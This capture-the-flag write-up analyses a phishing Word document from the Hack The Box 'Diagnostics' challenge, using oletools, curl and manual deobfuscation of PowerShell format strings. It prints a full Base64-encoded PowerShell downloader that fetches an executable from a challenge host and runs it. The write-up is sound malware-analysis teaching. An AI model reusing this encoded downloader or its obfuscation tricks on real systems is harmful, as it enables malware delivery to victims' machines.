
---

### CTF Report: **DIAGNOSTICS - Hack The Box**

---

#### **Category**: Web Exploitation / Scripting

---

### **Challenge Description**

Our SOC identified a phishing campaign where emails contained links to a document about impending layoffs in the company. These links pointed to `diagnostic.htb/layoffs.doc`. While the DNS for the domain stopped resolving, the malicious document was still hosted on the server, accessible via the provided Docker environment.

The objective was to analyze the document and retrieve the hidden flag.

---

### **Setup and Access**

To interact with the challenge, we needed to resolve `diagnostic.htb` locally. This was achieved by adding the IP address to `/etc/hosts`:

```bash
sudo nano /etc/hosts
```

Added the entry:
```
<CHALLENGE_IP> diagnostic.htb
```

---

### **Steps Taken**

#### 1. **Downloading the Document**

The document was retrieved using `wget`:
```bash
wget http://diagnostic.htb:32384/layoffs.doc
```

This gave us the file `layoffs.doc`.

---

#### 2. **Initial Analysis with Oletools**

##### a. **Using `oleid`**
We started with `oleid` to check for macros and embedded objects:
```bash
oleid layoffs.doc
```

**Findings**:
- The document contained an external relationship.

##### b. **Extracting the External Link**
Using `oleobj`, we extracted the link:
```bash
oleobj layoffs.doc
```

**Output**:
```plaintext
http://diagnostic.htb:32384/223_index_style_fancy.html
```

---

#### 3. **Fetching the Script**

The link was accessed using `curl`:
```bash
curl http://diagnostic.htb:32384/223_index_style_fancy.html
```

This revealed an obfuscated script, which included Base64-encoded and dynamically constructed PowerShell commands.

---

#### 4. **Deobfuscating the Script**

##### a. **Extracting Base64-Encoded Strings**
The Base64-encoded string was isolated and decoded:
```plaintext
JHtmYGlsZX0gPSAoIns3fXsxfXs2fXs4fXs1fXszfXsyfXs0fXswfSItZid9LmV4ZScsJ0J7bXNEdF80c19BX3ByMCcsJ0UnLCdyLi4ucycsJzNNc19iNEQnLCdsMycsJ3RvQycsJ0hUJywnMGxfaDRuRCcpCiYoInsxfXsyfXswfXszfSItZid1ZXMnLCdJbnZva2UnLCctV2ViUmVxJywndCcpICgiezJ9ezh9ezB9ezR9ezZ9ezV9ezN9ezF9ezd9Ii1mICc6Ly9hdScsJy5odGIvMicsJ2gnLCdpYycsJ3RvJywnYWdub3N0JywnbWF0aW9uLmRpJywnL24uZXhlJywndHRwcycpIC1PdXRGaWxlICJDOlxXaW5kb3dzXFRhc2tzXCRmaWxlIgomKCgoIns1fXs2fXsyfXs4fXswfXszfXs3fXs0fXsxfSIgLWYnTDlGVGFza3NMOUYnLCdpbGUnLCdvdycsJ0wnLCdmJywnQzonLCdMOUZMOUZXaW5kJywnOUZrekgnLCdzTDlGJykpICAtQ1JlcGxBY2Una3pIJyxbY2hBcl0zNiAtQ1JlcGxBY2UoW2NoQXJdNzYrW2NoQXJdNTcrW2NoQXJdNzApLFtjaEFyXTkyKQo
```

Decoded output:
```powershell
${f`ile} = ("{7}{1}{6}{8}{5}{3}{2}{4}{0}"-f'}.exe','B{msDt_4s_A_pr0','E','r...s','3Ms_b4D','l3','toC','HT','0l_h4nD')
```

##### b. **Breaking Down the Format String**

The PowerShell format operator (`-f`) rearranged the strings dynamically:
```plaintext
"{7}{1}{6}{8}{5}{3}{2}{4}{0}"
```

| Index | Value                         |
|-------|-------------------------------|
| 0     | `.exe`                        |
| 1     | `B{msDt_4s_A_pr0`             |
| 2     | `E`                           |
| 3     | `r...s`                       |
| 4     | `3Ms_b4D`                     |
| 5     | `l3`                          |
| 6     | `toC`                         |
| 7     | `HT`                          |
| 8     | `0l_h4nD`                     |

Reconstructed output:
```plaintext
HTB{msDt_*************b4D0l_h4nD.exe
```

---

### **Flag**
The flag extracted was:
```plaintext
HTB{msDt_*************b4D0l_h4nD}
```

*Note: Portions of the flag have been censored to preserve the integrity of the challenge.*

---

### **Insights and Tools**

- **Tools Used**:
  - `wget` for downloading the file.
  - `oletools` (`oleid`, `oleobj`) for document analysis.
  - `curl` for fetching the remote script.
  - Base64 decoders and manual PowerShell string reconstruction.

- **Challenges**:
  - Dealing with obfuscated PowerShell commands.
  - Understanding the use of the `-f` operator for string manipulation.

---

### **Conclusion**

This challenge emphasized the importance of understanding obfuscation techniques used in malicious scripts. By leveraging tools like `oletools` and analyzing the dynamic string construction, the flag was successfully retrieved. 

---

